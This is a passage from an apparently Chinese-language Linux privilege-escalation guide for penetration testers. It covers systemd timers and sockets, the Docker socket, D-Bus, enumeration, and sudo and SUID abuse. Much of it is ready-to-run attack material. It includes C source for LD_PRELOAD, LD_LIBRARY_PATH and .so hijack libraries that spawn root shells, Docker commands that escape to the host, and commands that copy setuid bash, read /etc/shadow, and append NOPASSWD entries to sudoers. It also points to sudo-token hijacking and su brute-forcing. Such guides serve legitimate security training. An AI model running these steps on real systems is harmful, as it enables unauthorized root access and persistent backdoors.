<pre><code class="language-bash">Unit=backdoor.service
</code></pre>
<p>在文档中，您可以阅读单位的定义：</p>
<blockquote>
<p>当此计时器到期时要激活的单位。参数是单位名称，其后缀不是“.timer”。如果未指定，则此值默认为与计时器单位同名的服务，后缀除外。（见上文。）建议激活的单位名称和计时器单位的单位名称在后缀之外命名相同。</p>
</blockquote>
<p>因此，要滥用此权限，您需要：</p>
<ul>
<li>找到某个 systemd 单元（如 <code>.service</code>），该单元正在 <strong>执行一个可写的二进制文件</strong></li>
<li>找到某个 systemd 单元，该单元正在 <strong>执行一个相对路径</strong>，并且您对 <strong>systemd PATH</strong> 具有 <strong>可写权限</strong>（以冒充该可执行文件）</li>
</ul>
<p><strong>通过 <code>man systemd.timer</code> 了解更多关于计时器的信息。</strong></p>
<h3 id="启用计时器"><a class="header" href="#启用计时器"><strong>启用计时器</strong></a></h3>
<p>要启用计时器，您需要 root 权限并执行：</p>
<pre><code class="language-bash">sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
</code></pre>
<p>注意 <strong>timer</strong> 是通过在 <code>/etc/systemd/system/&lt;WantedBy_section&gt;.wants/&lt;name&gt;.timer</code> 上创建一个符号链接来 <strong>激活</strong> 的。</p>
<h2 id="sockets"><a class="header" href="#sockets">Sockets</a></h2>
<p>Unix 域套接字 (UDS) 使得在客户端-服务器模型中同一台或不同机器上的 <strong>进程通信</strong> 成为可能。它们利用标准的 Unix 描述符文件进行计算机间通信，并通过 <code>.socket</code> 文件进行设置。</p>
<p>可以使用 <code>.socket</code> 文件配置套接字。</p>
<p><strong>通过 <code>man systemd.socket</code> 了解更多关于套接字的信息。</strong> 在此文件中，可以配置几个有趣的参数：</p>
<ul>
<li><code>ListenStream</code>, <code>ListenDatagram</code>, <code>ListenSequentialPacket</code>, <code>ListenFIFO</code>, <code>ListenSpecial</code>, <code>ListenNetlink</code>, <code>ListenMessageQueue</code>, <code>ListenUSBFunction</code>: 这些选项不同，但总结起来是 <strong>指示将要监听</strong> 套接字的位置（AF_UNIX 套接字文件的路径，监听的 IPv4/6 和/或端口号等）</li>
<li><code>Accept</code>: 接受一个布尔参数。如果 <strong>true</strong>，则 <strong>为每个传入连接生成一个服务实例</strong>，并且仅将连接套接字传递给它。如果 <strong>false</strong>，则所有监听套接字本身都被 <strong>传递给启动的服务单元</strong>，并且所有连接仅生成一个服务单元。对于数据报套接字和 FIFO，此值被忽略，因为单个服务单元无条件处理所有传入流量。<strong>默认为 false</strong>。出于性能原因，建议仅以适合 <code>Accept=no</code> 的方式编写新的守护进程。</li>
<li><code>ExecStartPre</code>, <code>ExecStartPost</code>: 接受一个或多个命令行，这些命令在监听 <strong>套接字</strong>/FIFO 被 <strong>创建</strong> 和绑定之前或之后 <strong>执行</strong>。命令行的第一个标记必须是绝对文件名，后面跟随进程的参数。</li>
<li><code>ExecStopPre</code>, <code>ExecStopPost</code>: 在监听 <strong>套接字</strong>/FIFO 被 <strong>关闭</strong> 和移除之前或之后 <strong>执行</strong> 的额外 <strong>命令</strong>。</li>
<li><code>Service</code>: 指定 <strong>在传入流量上激活的</strong> <strong>服务</strong> 单元名称。此设置仅允许用于 Accept=no 的套接字。默认为与套接字同名的服务（后缀被替换）。在大多数情况下，不需要使用此选项。</li>
</ul>
<h3 id="可写的-socket-文件"><a class="header" href="#可写的-socket-文件">可写的 .socket 文件</a></h3>
<p>如果您发现一个 <strong>可写</strong> 的 <code>.socket</code> 文件，您可以在 <code>[Socket]</code> 部分的开头添加类似 <code>ExecStartPre=/home/kali/sys/backdoor</code> 的内容，后门将在套接字创建之前执行。因此，您 <strong>可能需要等到机器重启。</strong><br />
&amp;#xNAN;<em>N注意系统必须使用该套接字文件配置，否则后门将不会被执行</em></p>
<h3 id="可写套接字"><a class="header" href="#可写套接字">可写套接字</a></h3>
<p>如果您 <strong>识别到任何可写套接字</strong>（<em>现在我们谈论的是 Unix 套接字，而不是配置 <code>.socket</code> 文件</em>），那么 <strong>您可以与该套接字进行通信</strong>，并可能利用一个漏洞。</p>
<h3 id="枚举-unix-套接字"><a class="header" href="#枚举-unix-套接字">枚举 Unix 套接字</a></h3>
<pre><code class="language-bash">netstat -a -p --unix
</code></pre>
<h3 id="原始连接"><a class="header" href="#原始连接">原始连接</a></h3>
<pre><code class="language-bash">#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
</code></pre>
<p><strong>利用示例：</strong></p>
<p>{% content-ref url="socket-command-injection.md" %}
<a href="socket-command-injection.html">socket-command-injection.md</a>
{% endcontent-ref %}</p>
<h3 id="http-套接字"><a class="header" href="#http-套接字">HTTP 套接字</a></h3>
<p>请注意，可能有一些 <strong>监听 HTTP</strong> 请求的 <strong>套接字</strong>（<em>我不是在谈论 .socket 文件，而是作为 unix 套接字的文件</em>）。您可以通过以下方式检查：</p>
<pre><code class="language-bash">curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
</code></pre>
<p>如果套接字 <strong>以 HTTP</strong> 请求响应，则您可以 <strong>与其通信</strong>，并可能 <strong>利用某些漏洞</strong>。</p>
<h3 id="可写的-docker-套接字"><a class="header" href="#可写的-docker-套接字">可写的 Docker 套接字</a></h3>
<p>Docker 套接字，通常位于 <code>/var/run/docker.sock</code>，是一个关键文件，应该被保护。默认情况下，它对 <code>root</code> 用户和 <code>docker</code> 组的成员是可写的。拥有对该套接字的写访问权限可能导致特权升级。以下是如何做到这一点的详细说明，以及在 Docker CLI 不可用时的替代方法。</p>
<h4 id="使用-docker-cli-进行特权升级"><a class="header" href="#使用-docker-cli-进行特权升级"><strong>使用 Docker CLI 进行特权升级</strong></a></h4>
<p>如果您对 Docker 套接字具有写访问权限，可以使用以下命令进行特权升级：</p>
<pre><code class="language-bash">docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
</code></pre>
<p>这些命令允许您以根级别访问主机的文件系统运行容器。</p>
<h4 id="直接使用-docker-api"><a class="header" href="#直接使用-docker-api"><strong>直接使用 Docker API</strong></a></h4>
<p>在 Docker CLI 不可用的情况下，仍然可以使用 Docker API 和 <code>curl</code> 命令操作 Docker 套接字。</p>
<ol>
<li><strong>列出 Docker 镜像：</strong> 检索可用镜像的列表。</li>
</ol>
<pre><code class="language-bash">curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
</code></pre>
<ol start="2">
<li><strong>创建容器：</strong> 发送请求以创建一个挂载主机系统根目录的容器。</li>
</ol>
<pre><code class="language-bash">curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"&lt;ImageID&gt;","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
</code></pre>
<p>启动新创建的容器：</p>
<pre><code class="language-bash">curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/&lt;NewContainerID&gt;/start
</code></pre>
<ol start="3">
<li><strong>附加到容器：</strong> 使用 <code>socat</code> 建立与容器的连接，从而在其中执行命令。</li>
</ol>
<pre><code class="language-bash">socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/&lt;NewContainerID&gt;/attach?stream=1&amp;stdin=1&amp;stdout=1&amp;stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
</code></pre>
<p>在设置好 <code>socat</code> 连接后，您可以直接在容器中执行命令，具有对主机文件系统的根级别访问权限。</p>
<h3 id="其他"><a class="header" href="#其他">其他</a></h3>
<p>请注意，如果您对 Docker 套接字具有写权限，因为您<strong>在 <code>docker</code> 组内</strong>，您有<a href="interesting-groups-linux-pe/#docker-group"><strong>更多的权限提升方式</strong></a>。如果<a href="../../network-services-pentesting/2375-pentesting-docker.html#compromising"><strong>docker API 在某个端口上监听</strong>，您也可以妥协它</a>。</p>
<p>查看<strong>更多从 docker 中突破或滥用它以提升权限的方法</strong>：</p>
<p>{% content-ref url="docker-security/" %}
<a href="docker-security/">docker-security</a>
{% endcontent-ref %}</p>
<h2 id="containerd-ctr-权限提升"><a class="header" href="#containerd-ctr-权限提升">Containerd (ctr) 权限提升</a></h2>
<p>如果您发现可以使用 <strong><code>ctr</code></strong> 命令，请阅读以下页面，因为<strong>您可能能够滥用它以提升权限</strong>：</p>
<p>{% content-ref url="containerd-ctr-privilege-escalation.md" %}
<a href="containerd-ctr-privilege-escalation.html">containerd-ctr-privilege-escalation.md</a>
{% endcontent-ref %}</p>
<h2 id="runc-权限提升"><a class="header" href="#runc-权限提升"><strong>RunC</strong> 权限提升</a></h2>
<p>如果您发现可以使用 <strong><code>runc</code></strong> 命令，请阅读以下页面，因为<strong>您可能能够滥用它以提升权限</strong>：</p>
<p>{% content-ref url="runc-privilege-escalation.md" %}
<a href="runc-privilege-escalation.html">runc-privilege-escalation.md</a>
{% endcontent-ref %}</p>
<h2 id="d-bus"><a class="header" href="#d-bus"><strong>D-Bus</strong></a></h2>
<p>D-Bus 是一个复杂的 <strong>进程间通信 (IPC) 系统</strong>，使应用程序能够高效地交互和共享数据。它是为现代 Linux 系统设计的，提供了一个强大的框架，用于不同形式的应用程序通信。</p>
<p>该系统灵活多变，支持基本的 IPC，增强了进程之间的数据交换，类似于 <strong>增强的 UNIX 域套接字</strong>。此外，它有助于广播事件或信号，促进系统组件之间的无缝集成。例如，来自蓝牙守护进程的关于来电的信号可以促使音乐播放器静音，从而增强用户体验。此外，D-Bus 支持远程对象系统，简化了应用程序之间的服务请求和方法调用，简化了传统上复杂的过程。</p>
<p>D-Bus 基于 <strong>允许/拒绝模型</strong>，根据匹配的策略规则的累积效果管理消息权限（方法调用、信号发射等）。这些策略指定与总线的交互，可能通过利用这些权限来允许权限提升。</p>
<p>在 <code>/etc/dbus-1/system.d/wpa_supplicant.conf</code> 中提供了这样一个策略的示例，详细说明了根用户拥有、发送和接收来自 <code>fi.w1.wpa_supplicant1</code> 消息的权限。</p>
<p>没有指定用户或组的策略适用于所有情况，而“默认”上下文策略适用于所有未被其他特定策略覆盖的情况。</p>
<pre><code class="language-xml">&lt;policy user="root"&gt;
&lt;allow own="fi.w1.wpa_supplicant1"/&gt;
&lt;allow send_destination="fi.w1.wpa_supplicant1"/&gt;
&lt;allow send_interface="fi.w1.wpa_supplicant1"/&gt;
&lt;allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/&gt;
&lt;/policy&gt;
</code></pre>
<p><strong>了解如何枚举和利用 D-Bus 通信：</strong></p>
<p>{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
<a href="d-bus-enumeration-and-command-injection-privilege-escalation.html">d-bus-enumeration-and-command-injection-privilege-escalation.md</a>
{% endcontent-ref %}</p>
<h2 id="网络"><a class="header" href="#网络"><strong>网络</strong></a></h2>
<p>枚举网络并确定机器的位置总是很有趣。</p>
<h3 id="通用枚举"><a class="header" href="#通用枚举">通用枚举</a></h3>
<pre><code class="language-bash">#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf &amp; /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2&gt;/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2&gt;/dev/null)

#Files used by network services
lsof -i
</code></pre>
<h3 id="open-ports"><a class="header" href="#open-ports">Open ports</a></h3>
<p>始终检查在您无法与之交互的机器上运行的网络服务：</p>
<pre><code class="language-bash">(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
</code></pre>
<h3 id="sniffing"><a class="header" href="#sniffing">Sniffing</a></h3>
<p>检查您是否可以嗅探流量。如果可以，您可能能够获取一些凭据。</p>
<pre><code>timeout 1 tcpdump
</code></pre>
<h2 id="用户"><a class="header" href="#用户">用户</a></h2>
<h3 id="通用枚举-1"><a class="header" href="#通用枚举-1">通用枚举</a></h3>
<p>检查 <strong>who</strong> 你是，拥有的 <strong>privileges</strong>，系统中有哪些 <strong>users</strong>，哪些可以 <strong>login</strong>，哪些具有 <strong>root privileges</strong>：</p>
<pre><code class="language-bash">#Info about me
id || (whoami &amp;&amp; groups) 2&gt;/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2&gt;/dev/null);do id $i;done 2&gt;/dev/null | sort
#Current user PGP keys
gpg --list-keys 2&gt;/dev/null
</code></pre>
<h3 id="big-uid"><a class="header" href="#big-uid">Big UID</a></h3>
<p>某些Linux版本受到一个漏洞的影响，允许<strong>UID &gt; INT_MAX</strong>的用户提升权限。更多信息：<a href="https://gitlab.freedesktop.org/polkit/polkit/issues/74">这里</a>，<a href="https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh">这里</a>和<a href="https://twitter.com/paragonsec/status/1071152249529884674">这里</a>。<br />
<strong>利用它</strong>使用：<strong><code>systemd-run -t /bin/bash</code></strong></p>
<h3 id="groups"><a class="header" href="#groups">Groups</a></h3>
<p>检查您是否是某个可能授予您root权限的<strong>组的成员</strong>：</p>
<p>{% content-ref url="interesting-groups-linux-pe/" %}
<a href="interesting-groups-linux-pe/">interesting-groups-linux-pe</a>
{% endcontent-ref %}</p>
<h3 id="clipboard"><a class="header" href="#clipboard">Clipboard</a></h3>
<p>检查剪贴板中是否有任何有趣的内容（如果可能的话）</p>
<pre><code class="language-bash">if [ `which xclip 2&gt;/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2&gt;/dev/null`
echo "Highlighted text: "`xclip -o 2&gt;/dev/null`
elif [ `which xsel 2&gt;/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2&gt;/dev/null`
echo "Highlighted text: "`xsel -o 2&gt;/dev/null`
else echo "Not found xsel and xclip"
fi
</code></pre>
<h3 id="密码策略"><a class="header" href="#密码策略">密码策略</a></h3>
<pre><code class="language-bash">grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
</code></pre>
<h3 id="已知密码"><a class="header" href="#已知密码">已知密码</a></h3>
<p>如果你<strong>知道环境中的任何密码</strong>，请尝试使用该密码<strong>登录每个用户</strong>。</p>
<h3 id="su-brute"><a class="header" href="#su-brute">Su Brute</a></h3>
<p>如果你不介意制造很多噪音，并且计算机上存在<code>su</code>和<code>timeout</code>二进制文件，你可以尝试使用<a href="https://github.com/carlospolop/su-bruteforce">su-bruteforce</a>进行暴力破解用户。<br />
<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite"><strong>Linpeas</strong></a> 使用<code>-a</code>参数也会尝试暴力破解用户。</p>
<h2 id="可写的-path-滥用"><a class="header" href="#可写的-path-滥用">可写的 PATH 滥用</a></h2>
<h3 id="path-1"><a class="header" href="#path-1">$PATH</a></h3>
<p>如果你发现可以<strong>在 $PATH 的某个文件夹内写入</strong>，你可能能够通过<strong>在可写文件夹内创建一个后门</strong>，其名称为将由其他用户（理想情况下是 root）执行的某个命令，并且该命令<strong>不是从位于你的可写文件夹之前的文件夹加载</strong>的，从而提升权限。</p>
<h3 id="sudo-和-suid"><a class="header" href="#sudo-和-suid">SUDO 和 SUID</a></h3>
<p>你可能被允许使用 sudo 执行某些命令，或者它们可能具有 suid 位。使用以下命令检查：</p>
<pre><code class="language-bash">sudo -l #Check commands you can execute with sudo
find / -perm -4000 2&gt;/dev/null #Find all SUID binaries
</code></pre>
<p>一些<strong>意外的命令允许您读取和/或写入文件，甚至执行命令。</strong> 例如：</p>
<pre><code class="language-bash">sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp&gt;!/bin/sh
less&gt;! &lt;shell_comand&gt;
</code></pre>
<h3 id="nopasswd"><a class="header" href="#nopasswd">NOPASSWD</a></h3>
<p>Sudo 配置可能允许用户在不知道密码的情况下以其他用户的权限执行某些命令。</p>
<pre><code>$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
</code></pre>
<p>在这个例子中，用户 <code>demo</code> 可以以 <code>root</code> 身份运行 <code>vim</code>，现在通过将 ssh 密钥添加到根目录或调用 <code>sh</code> 来获取 shell 变得微不足道。</p>
<pre><code>sudo vim -c '!sh'
</code></pre>
<h3 id="setenv"><a class="header" href="#setenv">SETENV</a></h3>
<p>此指令允许用户在执行某些操作时<strong>设置环境变量</strong>：</p>
<pre><code class="language-bash">$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
</code></pre>
<p>这个例子，<strong>基于 HTB 机器 Admirer</strong>，<strong>易受</strong> <strong>PYTHONPATH 劫持</strong> 的影响，在以 root 身份执行脚本时加载任意 python 库：</p>
<pre><code class="language-bash">sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
</code></pre>
<h3 id="sudo-执行绕过路径"><a class="header" href="#sudo-执行绕过路径">Sudo 执行绕过路径</a></h3>
<p><strong>跳转</strong> 以读取其他文件或使用 <strong>符号链接</strong>。例如在 sudoers 文件中： <em>hacker10 ALL= (root) /bin/less /var/log/*</em></p>
<pre><code class="language-bash">sudo less /var/logs/anything
less&gt;:e /etc/shadow #Jump to read other files using privileged less
</code></pre>
<pre><code class="language-bash">ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
</code></pre>
<p>如果使用 <strong>wildcard</strong> (*)，则更容易：</p>
<pre><code class="language-bash">sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
</code></pre>
<p><strong>对策</strong>: <a href="https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/">https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/</a></p>
<h3 id="没有命令路径的-sudo-命令suid-二进制文件"><a class="header" href="#没有命令路径的-sudo-命令suid-二进制文件">没有命令路径的 Sudo 命令/SUID 二进制文件</a></h3>
<p>如果 <strong>sudo 权限</strong> 被授予单个命令 <strong>而不指定路径</strong>: <em>hacker10 ALL= (root) less</em>，你可以通过更改 PATH 变量来利用它。</p>
<pre><code class="language-bash">export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
</code></pre>
<p>这种技术也可以在<strong>suid</strong>二进制文件<strong>执行另一个命令而不指定路径时使用（始终使用</strong><em><strong>strings</strong></em><strong>检查奇怪的SUID二进制文件的内容）</strong>。</p>
<p><a href="payloads-to-execute.html">执行的有效载荷示例。</a></p>
<h3 id="带命令路径的suid二进制文件"><a class="header" href="#带命令路径的suid二进制文件">带命令路径的SUID二进制文件</a></h3>
<p>如果<strong>suid</strong>二进制文件<strong>执行另一个命令并指定路径</strong>，那么你可以尝试<strong>导出一个名为该suid文件调用的命令的函数</strong>。</p>
<p>例如，如果一个suid二进制文件调用_<strong>/usr/sbin/service apache2 start</strong>_，你必须尝试创建该函数并导出它：</p>
<pre><code class="language-bash">function /usr/sbin/service() { cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p; }
export -f /usr/sbin/service
</code></pre>
<p>然后，当你调用suid二进制文件时，这个函数将被执行</p>
<h3 id="ld_preload--ld_library_path"><a class="header" href="#ld_preload--ld_library_path">LD_PRELOAD &amp; <strong>LD_LIBRARY_PATH</strong></a></h3>
<p><strong>LD_PRELOAD</strong>环境变量用于指定一个或多个共享库（.so文件），这些库将在加载器加载所有其他库之前被加载，包括标准C库（<code>libc.so</code>）。这个过程被称为预加载库。</p>
<p>然而，为了维护系统安全并防止此功能被利用，特别是在<strong>suid/sgid</strong>可执行文件中，系统强制执行某些条件：</p>
<ul>
<li>加载器忽略<strong>LD_PRELOAD</strong>对于真实用户ID（<em>ruid</em>）与有效用户ID（<em>euid</em>）不匹配的可执行文件。</li>
<li>对于具有suid/sgid的可执行文件，仅在标准路径中且也具有suid/sgid的库会被预加载。</li>
</ul>
<p>如果你有能力使用<code>sudo</code>执行命令，并且<code>sudo -l</code>的输出包含语句<strong>env_keep+=LD_PRELOAD</strong>，则可能发生权限提升。这种配置允许<strong>LD_PRELOAD</strong>环境变量持续存在并被识别，即使在使用<code>sudo</code>运行命令时，也可能导致以提升的权限执行任意代码。</p>
<pre><code>Defaults        env_keep += LD_PRELOAD
</code></pre>
<p>保存为 <strong>/tmp/pe.c</strong></p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
</code></pre>
<p>然后 <strong>编译它</strong> 使用：</p>
<pre><code class="language-bash">cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
</code></pre>
<p>最后，<strong>提升权限</strong> 运行</p>
<pre><code class="language-bash">sudo LD_PRELOAD=./pe.so &lt;COMMAND&gt; #Use any command you can run with sudo
</code></pre>
<p>{% hint style="danger" %}
如果攻击者控制了 <strong>LD_LIBRARY_PATH</strong> 环境变量，则可以滥用类似的权限提升，因为他控制了将要搜索库的路径。
{% endhint %}</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
</code></pre>
<pre><code class="language-bash"># Compile &amp; execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp &lt;COMMAND&gt;
</code></pre>
<h3 id="suid-二进制文件--so-注入"><a class="header" href="#suid-二进制文件--so-注入">SUID 二进制文件 – .so 注入</a></h3>
<p>当遇到一个具有 <strong>SUID</strong> 权限且看起来不寻常的二进制文件时，验证它是否正确加载 <strong>.so</strong> 文件是一个好习惯。可以通过运行以下命令来检查：</p>
<pre><code class="language-bash">strace &lt;SUID-BINARY&gt; 2&gt;&amp;1 | grep -i -E "open|access|no such file"
</code></pre>
<p>例如，遇到类似 <em>"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (没有这样的文件或目录)"</em> 的错误提示，暗示了潜在的利用可能性。</p>
<p>为了利用这一点，可以创建一个 C 文件，比如 <em>"/path/to/.config/libcalc.c"</em>，其中包含以下代码：</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p");
}
</code></pre>
<p>此代码在编译和执行后，旨在通过操纵文件权限并执行具有提升权限的 shell 来提升权限。</p>
<p>使用以下命令将上述 C 文件编译为共享对象 (.so) 文件：</p>
<pre><code class="language-bash">gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
</code></pre>
<p>最后，运行受影响的 SUID 二进制文件应该触发漏洞，从而可能导致系统被攻陷。</p>
<h2 id="共享对象劫持"><a class="header" href="#共享对象劫持">共享对象劫持</a></h2>
<pre><code class="language-bash"># Lets find a SUID using a non-standard library
ldd some_suid
something.so =&gt; /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
</code></pre>
<p>现在我们已经找到一个从我们可以写入的文件夹加载库的 SUID 二进制文件，让我们在该文件夹中创建具有必要名称的库：</p>
<pre><code class="language-c">//gcc src.c -fPIC -shared -o /development/libshared.so
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
</code></pre>
<p>如果您遇到如下错误</p>
<pre><code class="language-shell-session">./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
</code></pre>
<p>这意味着您生成的库需要有一个名为 <code>a_function_name</code> 的函数。</p>
<h3 id="gtfobins"><a class="header" href="#gtfobins">GTFOBins</a></h3>
<p><a href="https://gtfobins.github.io"><strong>GTFOBins</strong></a> 是一个经过策划的 Unix 二进制文件列表，攻击者可以利用这些文件绕过本地安全限制。<a href="https://gtfoargs.github.io/"><strong>GTFOArgs</strong></a> 则是针对只能 <strong>注入参数</strong> 的命令的情况。</p>
<p>该项目收集了可以被滥用以突破受限 shell、提升或维持特权、传输文件、生成绑定和反向 shell，以及促进其他后期利用任务的 Unix 二进制文件的合法功能。</p>
<blockquote>
<p>gdb -nx -ex '!sh' -ex quit<br />
sudo mysql -e '! /bin/sh'<br />
strace -o /dev/null /bin/sh<br />
sudo awk 'BEGIN {system("/bin/sh")}'</p>
</blockquote>
<p>{% embed url="https://gtfobins.github.io/" %}</p>
<p>{% embed url="https://gtfoargs.github.io/" %}</p>
<h3 id="fallofsudo"><a class="header" href="#fallofsudo">FallOfSudo</a></h3>
<p>如果您可以访问 <code>sudo -l</code>，您可以使用工具 <a href="https://github.com/CyberOne-Security/FallofSudo"><strong>FallOfSudo</strong></a> 来检查是否找到利用任何 sudo 规则的方法。</p>
<h3 id="重用-sudo-令牌"><a class="header" href="#重用-sudo-令牌">重用 Sudo 令牌</a></h3>
<p>在您拥有 <strong>sudo 访问权限</strong> 但没有密码的情况下，您可以通过 <strong>等待 sudo 命令执行然后劫持会话令牌</strong> 来提升特权。</p>
<p>提升特权的要求：</p>
<ul>
<li>您已经以用户 "<em>sampleuser</em>" 拥有一个 shell</li>
<li>"<em>sampleuser</em>" 在 <strong>过去 15 分钟内</strong> <strong>使用过 <code>sudo</code></strong> 执行某些操作（默认情况下，这是允许我们在不输入任何密码的情况下使用 <code>sudo</code> 的 sudo 令牌的持续时间）</li>
<li><code>cat /proc/sys/kernel/yama/ptrace_scope</code> 为 0</li>
<li><code>gdb</code> 可访问（您可以上传它）</li>
</ul>
<p>（您可以通过 <code>echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</code> 临时启用 <code>ptrace_scope</code>，或通过永久修改 <code>/etc/sysctl.d/10-ptrace.conf</code> 并设置 <code>kernel.yama.ptrace_scope = 0</code> 来实现）</p>
<p>如果满足所有这些要求，<strong>您可以使用以下方法提升特权：</strong> <a href="https://github.com/nongiach/sudo_inject"><strong>https://github.com/nongiach/sudo_inject</strong></a></p>
<ul>
<li><strong>第一个利用</strong> (<code>exploit.sh</code>) 将在 <em>/tmp</em> 中创建二进制文件 <code>activate_sudo_token</code>。您可以使用它来 <strong>激活您会话中的 sudo 令牌</strong>（您不会自动获得 root shell，请执行 <code>sudo su</code>）：</li>
</ul>
<pre><code class="language-bash">bash exploit.sh
/tmp/activate_sudo_token
sudo su
</code></pre>
<ul>
<li>第二个漏洞 (<code>exploit_v2.sh</code>) 将在 <em>/tmp</em> 中创建一个 <strong>由 root 拥有并设置了 setuid 的 sh shell</strong></li>
</ul>
<pre><code class="language-bash">bash exploit_v2.sh
/tmp/sh -p
</code></pre>
<ul>
<li>第<strong>三个漏洞</strong>（<code>exploit_v3.sh</code>）将<strong>创建一个sudoers文件</strong>，使<strong>sudo令牌永久有效并允许所有用户使用sudo</strong></li>
</ul>
<pre><code class="language-bash">bash exploit_v3.sh
sudo su
</code></pre>
<h3 id="varrunsudotsusername"><a class="header" href="#varrunsudotsusername">/var/run/sudo/ts/&lt;Username&gt;</a></h3>
<p>如果您在该文件夹或文件夹内创建的任何文件中具有<strong>写权限</strong>，则可以使用二进制文件 <a href="https://github.com/nongiach/sudo_inject/tree/master/extra_tools"><strong>write_sudo_token</strong></a> <strong>为用户和PID创建sudo令牌</strong>。<br />
例如，如果您可以覆盖文件 <em>/var/run/sudo/ts/sampleuser</em> 并且您以该用户的身份拥有PID 1234的shell，您可以<strong>获得sudo权限</strong>而无需知道密码，执行：</p>
<pre><code class="language-bash">./write_sudo_token 1234 &gt; /var/run/sudo/ts/sampleuser
</code></pre>
<h3 id="etcsudoers-etcsudoersd"><a class="header" href="#etcsudoers-etcsudoersd">/etc/sudoers, /etc/sudoers.d</a></h3>
<p>文件 <code>/etc/sudoers</code> 和 <code>/etc/sudoers.d</code> 中的文件配置了谁可以使用 <code>sudo</code> 以及如何使用。这些文件 <strong>默认情况下只能被用户 root 和组 root 读取</strong>。<br />
<strong>如果</strong> 你可以 <strong>读取</strong> 这个文件，你可能能够 <strong>获得一些有趣的信息</strong>，如果你可以 <strong>写入</strong> 任何文件，你将能够 <strong>提升权限</strong>。</p>
<pre><code class="language-bash">ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
</code></pre>
<p>如果你会写，你就可以滥用这个权限</p>
<pre><code class="language-bash">echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" &gt;&gt; /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" &gt;&gt; /etc/sudoers.d/README
</code></pre>
<p>另一种滥用这些权限的方法：</p>
<pre><code class="language-bash"># makes it so every terminal can sudo
